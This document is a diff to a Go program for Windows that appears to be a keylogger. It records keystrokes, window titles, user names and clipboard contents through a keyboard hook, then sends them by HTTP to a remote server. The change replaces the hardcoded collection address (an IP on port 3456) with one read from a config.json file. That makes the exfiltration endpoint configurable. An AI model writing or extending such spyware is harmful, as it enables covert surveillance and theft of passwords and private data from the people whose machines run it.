@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -11,7 +12,7 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
-
+	"path/filepath"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
@@ -52,6 +53,11 @@ type Payload struct {
 	Janela string `json:"janela"`
 	Teclas string `json:"teclas"`
 	Usuario string `json:"usuario"`
+}
+
+type IPs struct {
+	IP string `json: "ip"`
+
 }
 
 
@@ -103,10 +109,10 @@ func LerClipboard() string {
 	return dados
 }
 
-func envioHTTPrequest() {
+func envioHTTPrequest(address string) {
 	for dados := range canalFilaEnvio{
 		client := &http.Client{}
-		url := "http://100.76.234.19:3456"
+		url := address
 		jsondata, err :=  json.Marshal(dados)
 		if err != nil {
 			log.Println("Erro ao converter JSON:", err)
@@ -245,7 +251,25 @@ func main() {
 	}
 
 	//envioHTTP
-	go envioHTTPrequest()
+
+	pastaDoExecutavel, _ := filepath.Abs(filepath.Dir(os.Args[0]))
+	caminhoDoJson := filepath.Join(pastaDoExecutavel, "config.json")
+
+	configJson, err := os.Open(caminhoDoJson)
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer configJson.Close()
+
+	arrayBytes, _ := io.ReadAll(configJson)
+
+	objetoIp := IPs{}
+
+	json.Unmarshal(arrayBytes, &objetoIp)
+
+	go envioHTTPrequest(objetoIp.IP)
 
 
 	//HOOK de teclado
